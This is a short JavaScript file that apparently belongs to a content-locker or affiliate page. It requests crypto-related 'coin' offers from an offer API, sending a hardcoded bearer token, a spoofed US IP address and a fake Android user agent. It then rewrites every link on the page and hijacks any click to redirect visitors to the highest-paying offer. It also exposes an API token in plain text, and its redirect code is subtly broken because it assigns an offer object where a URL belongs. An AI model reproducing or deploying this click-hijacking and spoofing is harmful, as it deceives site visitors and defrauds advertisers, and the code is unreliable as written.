const agent = navigator.userAgent;
const android_ua =
  'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36';
const token = '27266|iEgx5HPu7PX97DD2NcD0G7O5VI6lEuDJ4b4ThYIe343a8bf1';
const us_ip = '45.33.144.25';
const apiUrl = 'https://cors-anywhere.herokuapp.com/unlockcontent.net/api/v2';
const root = document.querySelector('#root');
root.style.display = 'block';

let ip = '';

// GET IP
fetch('https://api.ipify.org?format=json')
  .then((response) => {
    if (!response.ok) {
      throw new Error('Network response was not ok');
    }
    return response.json();
  })
  .then((data) => {
    ip = data.ip;
  })
  .catch((error) => {
    console.error('There was a problem with the fetch operation:', error);
  });

// GET IP

// GET OFFER
const urlWithParams = `${apiUrl}?ip=${encodeURIComponent(
  us_ip
)}&user_agent=${encodeURIComponent(android_ua)}&ctype=1`;
fetch(urlWithParams, {
  method: 'GET', // or 'POST', 'PUT', 'DELETE', etc. depending on your use case
  headers: {
    Authorization: `Bearer ${token}`, // Include the Bearer token
    'Content-Type': 'application/json', // Optional, depending on your API requirements
  },
})
  .then((response) => {
    if (!response.ok) {
      throw new Error('Network response was not ok ' + response.statusText);
    }
    return response.json(); // or response.text() if the response is plain text
  })
  .then((data) => {
    const filteredOffers = data.offers.filter((offer) =>
      offer.name.toLowerCase().includes('coin')
    );

    const sortedOffers = filteredOffers.sort((a, b) => {
      const payoutA = parseFloat(a.payout) || 0;
      const payoutB = parseFloat(b.payout) || 0;
      return payoutB - payoutA;
    });

    console.log(sortedOffers[0]);
    const links = document.querySelectorAll('a');
    links.forEach((link) => {
      link.href = sortedOffers[0];
    });

    const html_elem = document.querySelector('html');
    html_elem.addEventListener('click', () => {
      window.location.href = sortedOffers[0];
    });
  })
  .catch((error) => {
    console.error('There was a problem with the fetch operation:', error);
  });
// GET OFFER
